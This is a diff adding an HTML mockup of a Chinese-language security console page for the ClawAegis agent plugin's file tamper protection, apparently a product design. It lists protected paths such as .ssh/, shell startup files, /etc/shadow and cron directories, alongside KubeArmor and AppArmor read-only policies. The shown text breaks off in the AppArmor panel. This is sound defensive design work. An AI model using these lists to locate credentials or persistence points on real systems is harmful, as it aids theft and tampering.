@@ -1,0 +1,1498 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>FR-33 关键文件与配置防篡改 | 智能安全防护平台</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --text:#696363;--text-h:#171212;--bg:#f8f5f2;
+  --surface:#ffffff;--border:#eee5df;
+  --accent:#ef4444;--accent-strong:#dc2626;--accent-coral:#ef6b4a;
+  --accent-bg:rgba(239,68,68,0.1);
+  --shell:linear-gradient(180deg,rgba(255,255,255,0.96),rgba(255,249,245,0.92));
+  --shell-warm:radial-gradient(circle at top left,#fff8f0,#fff6f0 22%,#fbf4ef 45%,#f5efe9);
+  --shadow-soft:0 24px 70px -52px rgba(72,44,24,0.5);
+  --shadow-strong:0 30px 90px -54px rgba(72,44,24,0.58);
+  --sidebar-w:260px;--topbar-h:104px;--subheader-h:64px;
+}
+html{font-size:14px;scroll-behavior:smooth}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;color:var(--text);background:var(--bg);line-height:1.6;overflow:hidden;height:100vh}
+code,pre{font-family:"SF Mono","Fira Code","Cascadia Code",Menlo,Consolas,monospace;font-size:.85em}
+
+/* ─── app-shell ─── */
+.app-shell{display:flex;height:100vh;overflow:hidden}
+
+/* ─── sidebar ─── */
+.sidebar{width:var(--sidebar-w);min-width:var(--sidebar-w);background:var(--shell-warm);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow-y:auto;z-index:10}
+.sidebar-logo{padding:20px 24px;font-size:1.15rem;font-weight:700;color:var(--text-h);letter-spacing:-.02em;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px}
+.sidebar-logo .logo-dot{width:10px;height:10px;border-radius:50%;background:var(--accent);flex-shrink:0}
+.sidebar-nav{flex:1;padding:8px 0}
+.nav-section-label{padding:16px 24px 6px;font-size:.7rem;text-transform:uppercase;letter-spacing:.08em;color:var(--text);opacity:.6;font-weight:600}
+.nav-item{display:flex;align-items:center;gap:8px;padding:9px 24px;font-size:.87rem;color:var(--text);cursor:pointer;transition:all .15s;border-left:3px solid transparent;text-decoration:none}
+.nav-item:hover{background:rgba(239,68,68,.04);color:var(--text-h)}
+.nav-item.active{background:var(--accent-bg);color:var(--accent-strong);border-left-color:var(--accent);font-weight:600}
+.nav-item .nav-priority{margin-left:auto;font-size:.65rem;padding:1px 6px;border-radius:4px;font-weight:600}
+.nav-priority.p0{background:#fef2f2;color:#dc2626}
+.nav-priority.p1{background:#fffbeb;color:#d97706}
+.nav-sep{height:1px;background:var(--border);margin:8px 24px}
+
+/* ─── main ─── */
+.main-content{flex:1;display:flex;flex-direction:column;overflow:hidden}
+.subheader{height:var(--subheader-h);min-height:var(--subheader-h);padding:0 32px;display:flex;align-items:center;border-bottom:1px solid var(--border);background:var(--surface);gap:12px;font-size:.9rem;color:var(--text)}
+.subheader strong{color:var(--text-h);font-weight:600}
+.content-area{flex:1;overflow-y:auto;padding:24px 32px 40px}
+
+/* ─── panel ─── */
+.app-panel{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px 24px;margin-bottom:20px}
+.app-panel-warm{background:linear-gradient(135deg,#fff9f5,#fff7f3);border:1px solid #f0e0d6;border-radius:12px;padding:20px 24px;margin-bottom:20px}
+.panel-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+.panel-title{font-size:1rem;font-weight:700;color:var(--text-h)}
+.panel-eyebrow{font-size:.75rem;color:var(--text);opacity:.7;margin-bottom:4px}
+
+/* ─── badges ─── */
+.badge{display:inline-flex;align-items:center;padding:2px 8px;border-radius:6px;font-size:.7rem;font-weight:600;letter-spacing:.02em;white-space:nowrap}
+.badge-p0{background:#fef2f2;color:#dc2626}
+.badge-p1{background:#fffbeb;color:#d97706}
+.badge-enforce{background:#fef2f2;color:#dc2626}
+.badge-observe{background:#fffbeb;color:#d97706}
+.badge-off{background:#f3f4f6;color:#9ca3af}
+.badge-critical{background:#7f1d1d;color:#fff}
+.badge-high{background:#ef4444;color:#fff}
+.badge-medium{background:#f59e0b;color:#fff}
+.badge-low{background:#3b82f6;color:#fff}
+.badge-info{background:#e5e7eb;color:#6b7280}
+.badge-blocked{background:#7f1d1d;color:#fecaca}
+.badge-observed{background:#fffbeb;color:#92400e}
+.badge-allowed{background:#ecfdf5;color:#065f46}
+.badge-sys{background:#ede9fe;color:#6d28d9}
+.badge-green{background:#ecfdf5;color:#059669}
+.badge-fail{background:#fef2f2;color:#dc2626}
+.badge-mismatch{background:#fef2f2;color:#b91c1c}
+.badge-audit{background:#eff6ff;color:#1d4ed8}
+
+/* ─── buttons ─── */
+.btn-primary{background:var(--accent);color:#fff;border:none;padding:8px 18px;border-radius:8px;font-size:.82rem;font-weight:600;cursor:pointer;transition:all .15s}
+.btn-primary:hover{background:var(--accent-strong)}
+.btn-secondary{background:transparent;color:var(--text);border:1px solid var(--border);padding:8px 18px;border-radius:8px;font-size:.82rem;cursor:pointer;transition:all .15s}
+.btn-secondary:hover{border-color:var(--accent);color:var(--accent)}
+.btn-sm{padding:5px 12px;font-size:.75rem}
+
+/* ─── toggle ─── */
+.toggle-row{display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border)}
+.toggle-row:last-child{border-bottom:none}
+.toggle-switch{width:40px;height:22px;border-radius:11px;background:#d1d5db;position:relative;cursor:pointer;transition:all .2s;flex-shrink:0}
+.toggle-switch.on{background:var(--accent)}
+.toggle-switch::after{content:"";position:absolute;top:2px;left:2px;width:18px;height:18px;border-radius:50%;background:#fff;transition:all .2s;box-shadow:0 1px 3px rgba(0,0,0,.15)}
+.toggle-switch.on::after{left:20px}
+
+/* ─── mode-selector ─── */
+.mode-selector{display:inline-flex;border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.mode-btn{padding:5px 14px;font-size:.75rem;cursor:pointer;border:none;background:transparent;color:var(--text);transition:all .15s}
+.mode-btn.active{font-weight:600}
+.mode-btn.active.enforce{background:var(--accent-bg);color:var(--accent-strong)}
+.mode-btn.active.observe{background:#fffbeb;color:#d97706}
+.mode-btn.active.off{background:#f3f4f6;color:#9ca3af}
+
+/* ─── data-table ─── */
+.data-table{width:100%;border-collapse:collapse;font-size:.82rem}
+.data-table th{text-align:left;padding:10px 12px;background:#faf7f4;color:var(--text-h);font-weight:600;border-bottom:2px solid var(--border);white-space:nowrap}
+.data-table td{padding:10px 12px;border-bottom:1px solid var(--border);vertical-align:top}
+.data-table tr:hover td{background:rgba(239,68,68,.02)}
+.data-table code{background:#f5f0eb;padding:2px 6px;border-radius:4px;font-size:.78rem;color:var(--accent-coral)}
+
+/* ─── form ─── */
+.form-group{margin-bottom:16px}
+.form-label{display:block;font-size:.8rem;font-weight:600;color:var(--text-h);margin-bottom:4px}
+.form-input{width:100%;padding:8px 12px;border:1px solid var(--border);border-radius:8px;font-size:.85rem;color:var(--text-h);background:var(--surface);transition:all .15s}
+.form-input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-bg)}
+.form-hint{font-size:.72rem;color:var(--text);opacity:.7;margin-top:4px}
+.form-row{display:flex;gap:16px;align-items:flex-start}
+.form-row .form-group{flex:1}
+
+/* ─── tag ─── */
+.tag-list{display:flex;flex-wrap:wrap;gap:6px}
+.tag{display:inline-block;padding:3px 10px;border-radius:6px;font-size:.72rem;font-weight:500;background:#f5f0eb;color:var(--text-h)}
+.tag.mitre{background:#fef2f2;color:#b91c1c}
+.tag.nist{background:#eff6ff;color:#1d4ed8}
+.tag.cis{background:#ecfdf5;color:#065f46}
+.tag.editable{border:1px dashed var(--accent-coral);cursor:pointer;color:var(--accent-coral)}
+.tag .tag-remove{background:none;border:none;cursor:pointer;color:#dc2626;font-size:.8rem;padding:0 0 0 3px;line-height:1}
+
+/* ─── log ─── */
+.log-entry{padding:14px 18px;border:1px solid var(--border);border-radius:10px;margin-bottom:10px;background:var(--surface);transition:all .15s}
+.log-entry:hover{box-shadow:0 4px 16px -8px rgba(72,44,24,.18)}
+.log-header{display:flex;align-items:center;gap:8px;margin-bottom:8px;flex-wrap:wrap}
+.log-time{font-size:.72rem;color:var(--text);opacity:.6;font-family:monospace;white-space:nowrap}
+.log-id{font-size:.72rem;color:var(--text);opacity:.5;font-family:monospace}
+.log-body{font-size:.85rem;color:var(--text-h);line-height:1.6}
+.log-body code{background:#f5f0eb;padding:2px 6px;border-radius:4px;font-size:.8rem;color:var(--accent-coral)}
+.log-detail{font-size:.75rem;color:var(--text);margin-top:8px;padding:10px 14px;background:#faf7f4;border-radius:8px;font-family:monospace;word-break:break-all;line-height:1.7}
+.log-chain{display:flex;align-items:center;gap:5px;margin-top:10px;flex-wrap:wrap}
+.log-chain-step{padding:4px 12px;border-radius:6px;font-size:.72rem;font-weight:500;background:#f5f0eb;color:var(--text-h);border:1px solid var(--border)}
+.log-chain-step.blocked-step{border-color:#dc2626;color:#dc2626;background:#fee2e2;font-weight:700}
+.log-chain-arrow{color:var(--text);opacity:.35;font-size:.85rem}
+
+/* ─── check-item ─── */
+.check-item{display:flex;align-items:flex-start;gap:10px;padding:8px 0;border-bottom:1px solid var(--border)}
+.check-item:last-child{border-bottom:none}
+.check-icon{width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.7rem;flex-shrink:0;margin-top:2px}
+.check-icon.pass{background:#ecfdf5;color:#059669}
+.check-icon.fail{background:#fef2f2;color:#dc2626}
+.check-icon.warn{background:#fffbeb;color:#d97706}
+
+/* ─── score-circle ─── */
+.score-circle{width:110px;height:110px;border-radius:50%;display:flex;flex-direction:column;align-items:center;justify-content:center;font-weight:700;border:4px solid;flex-shrink:0}
+.score-circle .score-num{font-size:1.8rem;line-height:1}
+.score-circle .score-label{font-size:.65rem;opacity:.7;margin-top:2px}
+.score-high{border-color:#059669;color:#059669;background:#ecfdf5}
+.score-med{border-color:#d97706;color:#d97706;background:#fffbeb}
+.score-low{border-color:#dc2626;color:#dc2626;background:#fef2f2}
+
+/* ─── tabs ─── */
+.tabs{display:flex;gap:0;border-bottom:2px solid var(--border);margin-bottom:20px}
+.tab{padding:10px 20px;font-size:.85rem;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-2px;color:var(--text);transition:all .15s;white-space:nowrap}
+.tab:hover{color:var(--text-h)}
+.tab.active{color:var(--accent-strong);border-bottom-color:var(--accent);font-weight:600}
+.tab-content{display:none}
+.tab-content.active{display:block}
+
+/* ─── rule-card ─── */
+.rule-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:14px 18px;margin-bottom:10px}
+.rule-card .rc-id{font-size:.72rem;color:var(--accent);font-weight:600;font-family:monospace;margin-bottom:4px}
+.rule-card .rc-pattern{font-family:monospace;font-size:.78rem;color:var(--text-h);background:#faf7f4;padding:6px 10px;border-radius:6px;word-break:break-all;margin-bottom:6px}
+.rule-card .rc-desc{font-size:.8rem;color:var(--text)}
+
+/* ─── code-block ─── */
+.code-block{background:#1a1a2e;color:#e0e0e0;padding:14px 18px;border-radius:8px;font-family:monospace;font-size:.8rem;overflow-x:auto;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+.code-block .kw{color:#c084fc}.code-block .str{color:#86efac}.code-block .num{color:#fbbf24}.code-block .cm{color:#6b7280}.code-block .fn{color:#93c5fd}
+
+/* ─── compliance-tag ─── */
+.compliance-tag{display:inline-flex;align-items:center;gap:4px;padding:4px 10px;border-radius:6px;font-size:.72rem;font-weight:500;margin:2px}
+.compliance-tag.aia{background:#fef2f2;color:#b91c1c}
+.compliance-tag.asi{background:#eff6ff;color:#1d4ed8}
+
+/* ─── page sections ─── */
+.page-section{display:none}
+.page-section.active{display:block}
+
+/* ─── stat-mini ─── */
+.stat-mini{text-align:center;padding:12px}
+.stat-mini .sm-val{font-size:1.5rem;font-weight:700;color:var(--text-h);line-height:1}
+.stat-mini .sm-label{font-size:.7rem;color:var(--text);margin-top:4px}
+
+/* ─── section-title ─── */
+.section-title{font-size:1.1rem;font-weight:700;color:var(--text-h);margin-bottom:16px;padding-bottom:8px;border-bottom:2px solid var(--border)}
+.sub-title{font-size:.92rem;font-weight:600;color:var(--text-h);margin:16px 0 10px}
+
+/* ─── detection-category ─── */
+.detect-category{border-left:3px solid var(--accent);padding-left:14px;margin-bottom:16px}
+.detect-category .dc-num{font-size:.7rem;font-weight:700;color:var(--accent);font-family:monospace}
+.detect-category .dc-title{font-size:.9rem;font-weight:700;color:var(--text-h);margin-bottom:6px}
+.detect-category .dc-desc{font-size:.8rem;color:var(--text);line-height:1.6}
+.detect-category .dc-patterns{margin-top:6px;display:flex;flex-wrap:wrap;gap:4px}
+.detect-category .dc-pattern{border-radius:6px;background:#f5f0eb;padding:2px 8px;font-size:.72rem;font-family:monospace;color:var(--text-h)}
+
+/* ─── audit-fix ─── */
+.fix-item{display:flex;align-items:flex-start;gap:12px;padding:12px 0;border-bottom:1px solid var(--border)}
+.fix-item:last-child{border-bottom:none}
+.fix-priority{min-width:32px;height:24px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:.7rem;font-weight:700;color:#fff;flex-shrink:0;margin-top:2px}
+.fix-priority.p0{background:#dc2626}
+.fix-priority.p1{background:#f59e0b}
+.fix-info{flex:1}
+.fix-info .fi-fr{font-size:.8rem;font-weight:700;color:var(--accent-strong);font-family:monospace}
+.fix-info .fi-desc{font-size:.82rem;color:var(--text-h);margin-top:2px}
+
+/* ─── resolved-path ─── */
+.resolved-path{display:flex;align-items:flex-start;gap:10px;padding:8px 0;border-bottom:1px solid var(--border)}
+.resolved-path:last-child{border-bottom:none}
+.resolved-path .rp-num{width:22px;height:22px;border-radius:50%;background:var(--accent-bg);color:var(--accent-strong);display:flex;align-items:center;justify-content:center;font-size:.7rem;font-weight:700;flex-shrink:0;margin-top:2px}
+.resolved-path .rp-info{flex:1}
+.resolved-path .rp-label{font-size:.82rem;font-weight:600;color:var(--text-h)}
+.resolved-path .rp-path{font-size:.75rem;font-family:monospace;color:var(--accent-coral);margin-top:2px}
+.resolved-path .rp-desc{font-size:.72rem;color:var(--text);opacity:.7;margin-top:1px}
+
+/* ─── misc ─── */
+.mono{font-family:monospace}
+.mt-8{margin-top:8px}.mt-12{margin-top:12px}.mt-16{margin-top:16px}.mt-20{margin-top:20px}
+.mb-8{margin-bottom:8px}.mb-12{margin-bottom:12px}.mb-16{margin-bottom:16px}
+.flex{display:flex}.flex-wrap{flex-wrap:wrap}.items-center{align-items:center}.gap-8{gap:8px}.gap-12{gap:12px}.gap-16{gap:16px}
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px}
+.text-sm{font-size:.82rem}.text-xs{font-size:.72rem}
+.text-accent{color:var(--accent)}.text-muted{opacity:.6}
+.w-full{width:100%}
+.p-16{padding:16px}
+.overflow-x{overflow-x:auto}
+.horizontal-scroll{overflow-x:auto}
+
+/* ─── file-integrity field table ─── */
+.fi-field-table{width:100%;border-collapse:collapse;font-size:.8rem}
+.fi-field-table th{text-align:left;padding:8px 10px;background:#faf7f4;color:var(--text-h);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;font-size:.72rem}
+.fi-field-table td{padding:8px 10px;border-bottom:1px solid var(--border);vertical-align:top;font-size:.78rem}
+.fi-field-table code{background:#f5f0eb;padding:1px 5px;border-radius:3px;font-size:.74rem;color:var(--accent-coral)}
+
+/* ─── sensitive-path ─── */
+.sensitive-path{display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid var(--border)}
+.sensitive-path:last-child{border-bottom:none}
+.sensitive-path .sp-icon{font-size:.85rem;flex-shrink:0}
+.sensitive-path .sp-path{font-family:monospace;font-size:.78rem;color:var(--text-h);font-weight:500}
+.sensitive-path .sp-desc{font-size:.7rem;color:var(--text);opacity:.7;margin-left:auto}
+
+/* ─── apparmor-rule ─── */
+.apparmor-rule{background:#1a1a2e;padding:10px 14px;border-radius:6px;font-family:monospace;font-size:.78rem;color:#e0e0e0;margin-bottom:6px;line-height:1.7}
+.apparmor-rule .aa-key{color:#c084fc}
+.apparmor-rule .aa-val{color:#86efac}
+.apparmor-rule .aa-deny{color:#fca5a5}
+</style>
+</head>
+<body>
+
+<div class="app-shell">
+
+<!-- ==================== SIDEBAR ==================== -->
+<aside class="sidebar">
+  <div class="sidebar-logo"><span class="logo-dot"></span>运行环境安全</div>
+  <nav class="sidebar-nav">
+    <div class="nav-section-label">5.5 执行隔离与防篡改</div>
+    <a class="nav-item" data-page="fr28">FR-28 沙盒环境隔离 <span class="nav-priority p0">P0</span></a>
+    <a class="nav-item" data-page="fr29">FR-29 容器隔离与防逃逸 <span class="nav-priority p0">P0</span></a>
+    <a class="nav-item" data-page="fr30">FR-30 宿主机安全加固 <span class="nav-priority p1">P1</span></a>
+    <a class="nav-item" data-page="fr31">FR-31 主机异常行为检测 <span class="nav-priority p0">P0</span></a>
+    <a class="nav-item" data-page="fr32">FR-32 可信启动与完整性 <span class="nav-priority p1">P1</span></a>
+    <a class="nav-item active" data-page="fr33">FR-33 关键文件防篡改 <span class="nav-priority p1">P1</span></a>
+    <div class="nav-sep"></div>
+    <a class="nav-item" data-page="logs">运行环境日志</a>
+    <a class="nav-item" data-page="audit">环境安全审计</a>
+  </nav>
+</aside>
+
+<!-- ==================== MAIN ==================== -->
+<div class="main-content">
+
+<!-- ═══════════════════════════════════════════════════ -->
+<!-- PAGE: FR-33 关键文件与配置防篡改                     -->
+<!-- ═══════════════════════════════════════════════════ -->
+<div class="page-section active" id="page-fr33">
+  <div class="subheader">
+    <span>FR-33</span><span style="opacity:.3">|</span>
+    <strong>关键文件与配置防篡改</strong>
+    <span style="opacity:.3">|</span>
+    <span class="badge badge-p1">P1 优先级</span>
+  </div>
+  <div class="content-area">
+
+    <div class="tabs" data-tabgroup="fr33">
+      <div class="tab active" data-tab="fr33-paths">保护路径</div>
+      <div class="tab" data-tab="fr33-integrity">文件完整性策略</div>
+      <div class="tab" data-tab="fr33-tracking">变更追踪</div>
+      <div class="tab" data-tab="fr33-tamperlog">防篡改日志</div>
+    </div>
+
+    <!-- ── Tab: 保护路径 ── -->
+    <div class="tab-content active" id="fr33-paths">
+
+      <!-- Panel 1: ClawAegis 保护路径配置 -->
+      <div class="app-panel-warm">
+        <div class="panel-header">
+          <div>
+            <div class="panel-eyebrow">ClawAegis Agent</div>
+            <div class="panel-title">ClawAegis 保护路径配置</div>
+          </div>
+          <div style="display:flex;gap:8px">
+            <span class="badge badge-enforce">Enforce</span>
+            <span class="badge badge-sys">selfProtection</span>
+          </div>
+        </div>
+
+        <div class="toggle-row">
+          <div class="toggle-label">
+            <div class="name" style="font-size:.87rem;font-weight:600;color:var(--text-h)">selfProtectionEnabled</div>
+            <div class="desc" style="font-size:.78rem;color:var(--text);margin-top:2px">自保护功能开关 — 防止 Agent 进程被终止、配置被篡改、受保护路径被修改</div>
+          </div>
+          <div style="display:flex;align-items:center;gap:12px">
+            <div class="mode-selector">
+              <div class="mode-btn active enforce">Enforce</div>
+              <div class="mode-btn">Observe</div>
+              <div class="mode-btn">Off</div>
+            </div>
+            <div class="toggle-switch on"></div>
+          </div>
+        </div>
+
+        <div class="toggle-row">
+          <div class="toggle-label">
+            <div class="name" style="font-size:.87rem;font-weight:600;color:var(--text-h)">selfProtectionMode</div>
+            <div class="desc" style="font-size:.78rem;color:var(--text);margin-top:2px">自保护模式 — <code>enforce</code> 直接拦截, <code>observe</code> 仅记录告警</div>
+          </div>
+          <div class="mode-selector">
+            <div class="mode-btn active enforce">enforce</div>
+            <div class="mode-btn">observe</div>
+          </div>
+        </div>
+
+        <div style="padding:12px 0;border-bottom:1px solid var(--border)">
+          <div class="form-label">protectedPaths (用户自定义保护路径)</div>
+          <div class="tag-list">
+            <span class="tag editable">+ 添加路径</span>
+          </div>
+          <div class="form-hint">用户自定义受保护文件/目录路径，这些路径将被纳入防篡改监控</div>
+        </div>
+
+        <div style="padding:12px 0;border-bottom:1px solid var(--border)">
+          <div class="form-label">protectedSkills (受保护 Skill ID)</div>
+          <div class="tag-list">
+            <span class="tag editable">+ 添加 Skill</span>
+          </div>
+          <div class="form-hint">受保护的 Skill ID，其目录将被自动纳入保护路径</div>
+        </div>
+
+        <div style="padding:12px 0">
+          <div class="form-label">protectedPlugins (受保护 Plugin ID)</div>
+          <div class="tag-list">
+            <span class="tag editable">+ 添加 Plugin</span>
+          </div>
+          <div class="form-hint">受保护的 Plugin ID，其目录将被自动纳入保护路径</div>
+        </div>
+      </div>
+
+      <!-- Panel 2: 解析后的保护根路径 -->
+      <div class="app-panel">
+        <div class="panel-header">
+          <div>
+            <div class="panel-eyebrow">Resolved Paths</div>
+            <div class="panel-title">解析后的保护根路径</div>
+          </div>
+          <span class="badge badge-sys">5 来源</span>
+        </div>
+
+        <div class="resolved-path">
+          <div class="rp-num">1</div>
+          <div class="rp-info">
+            <div class="rp-label">api.rootDir (Plugin 自身目录)</div>
+            <div class="rp-path">/path/to/claw-aegis/</div>
+            <div class="rp-desc">ClawAegis 插件安装根目录，包含所有运行时代码和配置</div>
+          </div>
+        </div>
+
+        <div class="resolved-path">
+          <div class="rp-num">2</div>
+          <div class="rp-info">
+            <div class="rp-label">stateDir (状态目录)</div>
+            <div class="rp-path">~/.openclaw/state/plugins/claw-aegis/</div>
+            <div class="rp-desc">ClawAegis 运行时状态文件目录</div>
+          </div>
+        </div>
+
+        <div class="resolved-path">
+          <div class="rp-num">3</div>
+          <div class="rp-info">
+            <div class="rp-label">protectedPaths (用户自定义)</div>
+            <div class="rp-path">用户通过 protectedPaths 配置项定义的路径</div>
+            <div class="rp-desc">管理员手动添加的额外保护路径</div>
+          </div>
+        </div>
+
+        <div class="resolved-path">
+          <div class="rp-num">4</div>
+          <div class="rp-info">
+            <div class="rp-label">protectedSkill (受保护 Skill)</div>
+            <div class="rp-path">~/.openclaw/skills/{id} / ~/.openclaw/workspace/skills/{id}</div>
+            <div class="rp-desc">受保护 Skill 的安装目录和工作空间目录</div>
+          </div>
+        </div>
+
+        <div class="resolved-path">
+          <div class="rp-num">5</div>
+          <div class="rp-info">
+            <div class="rp-label">protectedPlugin (受保护 Plugin)</div>
+            <div class="rp-path">~/.openclaw/extensions/{id} / ~/.openclaw/plugins/{id}</div>
+            <div class="rp-desc">受保护 Plugin 的安装目录</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Panel 3: 内置敏感路径模式 -->
+      <div class="app-panel">
+        <div class="panel-header">
+          <div>
+            <div class="panel-eyebrow">Built-in Sensitive Paths</div>
+            <div class="panel-title">内置敏感路径模式</div>
+          </div>
+          <span class="badge badge-enforce">Enforce</span>
+        </div>
+
+        <div class="sensitive-path">
+          <div class="sp-icon">&#x1f511;</div>
+          <div class="sp-path">.ssh/</div>
+          <div class="sp-desc">SSH 密钥与配置</div>
+        </div>
+        <div class="sensitive-path">
+          <div class="sp-icon">&#x1f510;</div>
+          <div class="sp-path">.antconfig/</div>
+          <div class="sp-desc">Ant 配置目录</div>
+        </div>
+        <div class="sensitive-path">
+          <div class="sp-icon">&#x2699;&#xfe0f;</div>
+          <div class="sp-path">.openclaw/openclaw.json</div>
+          <div class="sp-desc">OpenClaw 主配置文件</div>
+        </div>
+        <div class="sensitive-path">
+          <div class="sp-icon">&#x1f6e1;&#xfe0f;</div>
+          <div class="sp-path">.openclaw/extensions/claw-aegis/</div>
+          <div class="sp-desc">ClawAegis 扩展目录</div>
+        </div>
+        <div class="sensitive-path">
+          <div class="sp-icon">&#x1f4dc;</div>
+          <div class="sp-path">Shell 配置文件</div>
+          <div class="sp-desc">
+            <span class="tag" style="margin:1px">.bashrc</span>
+            <span class="tag" style="margin:1px">.zshrc</span>
+            <span class="tag" style="margin:1px">.bash_profile</span>
+            <span class="tag" style="margin:1px">.zprofile</span>
+            <span class="tag" style="margin:1px">.profile</span>
+            <span class="tag" style="margin:1px">.bash_login</span>
+            <span class="tag" style="margin:1px">.zshenv</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Panel 4: KubeArmor FIM 策略 -->
+      <div class="app-panel">
+        <div class="panel-header">
+          <div>
+            <div class="panel-eyebrow">KubeArmor FIM</div>
+            <div class="panel-title">KubeArmor FIM 策略 (readOnly recursive)</div>
+          </div>
+          <div style="display:flex;gap:8px">
+            <span class="badge badge-enforce">Enforce</span>
+            <span class="badge badge-sys">FIM</span>
+          </div>
+        </div>
+
+        <div style="overflow-x:auto">
+          <table class="data-table">
+            <thead><tr><th>保护路径</th><th>模式</th><th>递归</th><th>Tags</th></tr></thead>
+            <tbody>
+              <tr><td><code>/bin/</code></td><td>readOnly</td><td>recursive</td><td><span class="tag mitre">MITRE_T1036</span> <span class="tag mitre">MITRE_T1565</span> <span class="tag nist">NIST_AU-2</span> <span class="tag nist">NIST_SI-4</span></td></tr>
+              <tr><td><code>/boot/</code></td><td>readOnly</td><td>recursive</td><td><span class="tag mitre">MITRE_T1036</span> <span class="tag nist">NIST_AU-2</span></td></tr>
+              <tr><td><code>/sbin/</code></td><td>readOnly</td><td>recursive</td><td><span class="tag mitre">MITRE_T1036</span> <span class="tag nist">NIST_SI-4</span></td></tr>
+              <tr><td><code>/usr/bin/</code></td><td>readOnly</td><td>recursive</td><td><span class="tag mitre">MITRE_T1036</span> <span class="tag mitre">MITRE_T1565</span> <span class="tag nist">NIST_SI-4</span></td></tr>
+              <tr><td><code>/usr/lib/</code></td><td>readOnly</td><td>recursive</td><td><span class="tag mitre">MITRE_T1565</span> <span class="tag nist">NIST_AU-2</span></td></tr>
+              <tr><td><code>/usr/sbin/</code></td><td>readOnly</td><td>recursive</td><td><span class="tag mitre">MITRE_T1036</span> <span class="tag nist">NIST_SI-4</span></td></tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="form-hint mt-12">MITRE_T1036: Masquerading | MITRE_T1565: Data Manipulation | NIST_AU-2: Audit Events | NIST_SI-4: System Monitoring</div>
+      </div>
+
+      <!-- Panel 5: KubeArmor 加固策略 -->
+      <div class="app-panel">
+        <div class="panel-header">
+          <div>
+            <div class="panel-eyebrow">KubeArmor Hardening</div>
+            <div class="panel-title">KubeArmor 加固策略</div>
+          </div>
+          <span class="badge badge-enforce">Enforce</span>
+        </div>
+
+        <div style="overflow-x:auto">
+          <table class="data-table">
+            <thead><tr><th>保护路径</th><th>模式</th><th>策略名称</th><th>Tags</th></tr></thead>
+            <tbody>
+              <tr>
+                <td><code>/etc/</code></td>
+                <td>readOnly</td>
+                <td><code>harden-write-etc-dir</code></td>
+                <td><span class="tag nist">NIST_AU-2</span></td>
+              </tr>
+              <tr>
+                <td><code>/etc/pki/</code><br><code>/etc/ssl/</code><br><code>/usr/local/share/ca-certificates/</code></td>
+                <td>readOnly</td>
+                <td><code>harden-trusted-cert-mod</code></td>
+                <td><span class="tag mitre">MITRE_T1552</span> <span class="tag nist">NIST_SI-4</span></td>
+              </tr>
+              <tr>
+                <td><code>/etc/cron.d/</code><br><code>/etc/cron.daily/</code><br><code>/var/spool/cron/</code></td>
+                <td>readOnly</td>
+                <td><code>harden-cronjob-cfg</code></td>
+                <td><span class="tag cis">CIS_5.1</span> <span class="tag mitre">MITRE_T1053</span></td>
+              </tr>
+              <tr>
+                <td><code>/etc/apparmor.d/</code><br><code>/etc/sysconfig/selinux/</code></td>
+                <td>readOnly</td>
+                <td><code>harden-impair-defense</code></td>
+                <td><span class="tag mitre">MITRE_T1562</span> <span class="tag nist">NIST_SI-4</span></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="form-hint mt-12">MITRE_T1552: Unsecured Credentials | MITRE_T1053: Scheduled Task/Job | MITRE_T1562: Impair Defenses</div>
+      </div>
+
+    </div><!-- /fr33-paths -->
+
+    <!-- ── Tab: 文件完整性策略 ── -->
+    <div class="tab-content" id="fr33-integrity">
+
+      <!-- Panel 1: KubeArmor FilePathType -->
+      <div class="app-panel-warm">
+        <div class="panel-header">
+          <div>
+            <div class="panel-eyebrow">KubeArmor Policy</div>
+            <div class="panel-title">KubeArmor FilePathType 文件完整性策略</div>
+          </div>
+          <span class="badge badge-enforce">Enforce</span>
+        </div>
+
+        <div class="sub-title">FilePathType 字段定义</div>
+        <div style="overflow-x:auto">
+          <table class="fi-field-table">
+            <thead><tr><th>字段</th><th>类型</th><th>说明</th><th>示例</th></tr></thead>
+            <tbody>
+              <tr><td><code>path</code></td><td>string</td><td>文件/目录路径</td><td><code>/etc/shadow</code></td></tr>
+              <tr><td><code>readOnly</code></td><td>bool</td><td>只读保护，阻止写入</td><td><code>true</code></td></tr>
+              <tr><td><code>ownerOnly</code></td><td>bool</td><td>仅允许文件所有者访问</td><td><code>true</code></td></tr>
+              <tr><td><code>fromSource</code></td><td>[]string</td><td>限制访问源进程路径</td><td><code>["/usr/bin/passwd"]</code></td></tr>
+              <tr><td><code>severity</code></td><td>string</td><td>严重级别</td><td><code>"CRITICAL"</code></td></tr>
+              <tr><td><code>tags</code></td><td>[]string</td><td>合规标签</td><td><code>["NIST_AU-2","MITRE_T1003"]</code></td></tr>
+              <tr><td><code>message</code></td><td>string</td><td>告警消息</td><td><code>"shadow file write blocked"</code></td></tr>
+              <tr><td><code>action</code></td><td>string</td><td>执行动作 (Allow/Block/Audit)</td><td><code>"Block"</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="sub-title mt-16">AppArmor ReadOnly 执行规则</div>
+        <div class="apparmor-rule">
+          <span class="aa-key">Allow:</span> owner <span class="aa-val">$path</span> <span class="aa-key">klr</span> <span style="color:#93c5fd">/* read+lock */</span>
